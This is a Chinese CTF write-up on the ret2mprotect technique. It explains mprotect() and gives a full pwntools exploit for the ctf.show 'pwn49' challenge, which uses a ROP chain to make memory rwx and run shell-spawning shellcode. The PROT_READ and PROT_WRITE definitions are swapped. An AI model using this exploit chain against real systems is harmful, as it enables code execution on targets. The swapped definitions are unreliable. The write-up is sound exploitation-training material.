## pwn ret2mprotect

mprotect函数：用来修复一段指定内存区域的保护属性

原型如下：

```
int mprotect(const void* start ,size_t len,int prot);
void* start：区段开始位置（第一个参数填的是一个地址，是指需要进行操作的地址。）
size_t len :区段的大小（第二个参数是地址往后多大的长度）
int prot：区段的权限

mprotect()函数把自start开始的，长度位len的内存区的保护属性修改为prot指定的值
```

prot可以取以下几个值,并且可以用"|"将几个属性合起来使用:

1. PROT_READ:表示内存段内的内容可写;
2. PROT_WRITE:表示内存段内的内容可读;
3. PROT_EXEC:表示内存段中的内容可执行;
4. PROT_NONE:表示内存段中的内容根本无法访问。
5.  prot=7 是可读可写可执行

指定的内存区间必须包含整个内存页(4K) 。区间开始的地址start必须是一个内存页的起始地址,并且区间长度len必须是页大小的整数倍。因为程序本身也是静态编译，所以地址是不会变的。

可以通过mprotect()函数来修改区段的权限(例如bss),使其权限变为(rwx),然后将shellcode写进去并跳转过去.

---

### pwn49

![image-20241117180653836](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241117180653836.png)

这里发现有一个栈保护但是实际上这个栈保护是没有的

一个明显的栈溢出

![image-20241117180818580](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241117180818580.png)

这里主要是使用了mprotect的函数使用 可以对文件进行更改他的文件权限因此可以变成rwx因此他的exp：

```python
from pwn import *


# io =process("/home/fofa/pwn")
elf = ELF("/home/fofa/pwn")
io = remote("pwn.challenge.ctf.show", 28114)
mprotect = elf.sym["mprotect"]
read = elf.sym["read"]

ebx_esi_ebp_ret = 0x080a019b# 0x080a019b : pop ebx ; pop esi ; pop ebp ; ret
got_plt = 0x080DA000
lenth = 0x1000
port = 0x7

shellcode = asm(shellcraft.sh())

payload = cyclic(0x12+4) +p32(mprotect)+ p32(ebx_esi_ebp_ret)+p32(got_plt)+p32(lenth)+p32(port)
payload += p32(read)
payload += p32(ebx_esi_ebp_ret)+p32(0)+p32(got_plt)+p32(lenth)+p32(got_plt)

io.sendline(payload)
io.sendline(shellcode)
io.interactive()
```

---

### pwn50

